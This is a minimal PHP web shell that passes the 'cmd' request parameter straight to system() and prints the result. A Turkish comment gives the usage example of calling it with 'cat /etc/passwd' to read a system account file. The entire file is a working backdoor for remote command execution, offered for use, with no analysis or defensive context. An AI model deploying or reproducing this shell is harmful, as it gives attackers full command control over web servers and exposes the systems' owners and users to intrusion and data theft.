<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
/* cmd.php?cmd=cat /etc/passwd 
	şeklinde kullanın
*/
?>